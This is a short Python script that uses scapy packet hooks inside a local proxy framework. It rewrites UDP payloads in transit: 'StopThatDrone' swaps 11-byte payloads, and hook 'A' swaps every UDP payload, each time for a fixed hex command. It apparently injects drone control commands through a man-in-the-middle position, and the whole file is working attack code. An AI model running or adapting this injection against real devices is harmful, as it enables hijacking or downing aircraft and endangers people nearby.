import sys
sys.path.insert(0, '/root/tbmg/scapyProxy/')
from HookUtils import *
from scapy.all import *

class StopThatDrone(PacketHook):
    def run(self):
        try:
            self.scapy_packet['UDP']
            if len(self.scapy_packet['Raw'].load.encode('hex')) == 22:
                self.scapy_packet['Raw'].load = 'ff087e3f403f901010a06b'.decode('hex')
        except:
            pass
        return self.accept()
    

class A(PacketHook):
    def run(self):
        try:
            self.scapy_packet['UDP']
            self.scapy_packet['Raw'].load = 'ff087e3f403f901010a06b'.decode('hex')
        except:
            pass
        return self.accept()

if __name__=='__main__':
    pack = IP(dst='8.8.8.8')/UDP()/Raw(load="aa087e3f684f901010000b".decode('hex'))
    pack.show()
    hook = StopThatDrone(pack)
    hook.run()
    hook.scapy_packet.show()